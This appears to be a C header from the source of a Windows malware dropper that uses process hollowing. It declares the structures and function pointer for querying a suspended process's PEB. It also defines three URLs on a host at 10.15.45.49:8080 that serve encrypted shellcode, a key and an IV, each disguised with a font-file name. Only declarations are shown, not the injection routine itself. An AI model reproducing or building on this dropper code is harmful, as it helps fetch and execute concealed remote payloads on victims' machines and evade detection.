#pragma once
#ifndef DROPPER_PROCESS_HOLLOWING_H
#define DROPPER_PROCESS_HOLLOWING_H

#include <windows.h>
#include <stdio.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

    // Define NTSTATUS for ZwQueryInformationProcess
    typedef LONG NTSTATUS;

    // Structure for basic process information (manually defined)
    typedef struct _PROCESS_BASIC_INFORMATION {
        PVOID Reserved1;
        PVOID PebBaseAddress;
        PVOID Reserved2;
        PVOID Reserved3;
        ULONG_PTR UniqueProcessId;
        PVOID Reserved4;
    } PROCESS_BASIC_INFORMATION;

    // Function pointer type for ZwQueryInformationProcess
    typedef NTSTATUS(WINAPI* PFN_ZWQUERYINFORMATIONPROCESS)(
        HANDLE ProcessHandle,
        int ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
        );

#define CREATE_SUSPENDED                0x4
#define PROCESS_BASIC_INFORMATION_CLASS 0 // Query class for basic information

#define ENCRYPTED_SHELLCODE_URL         L"http://10.15.45.49:8080/good-file.woff"
#define KEY_URL                         L"http://10.15.45.49:8080/good-file.ttf"
#define IV_URL                          L"http://10.15.45.49:8080/good-file.woff2"

#ifdef __cplusplus
}
#endif

#endif // DROPPER_PROCESS_HOLLOWING_H

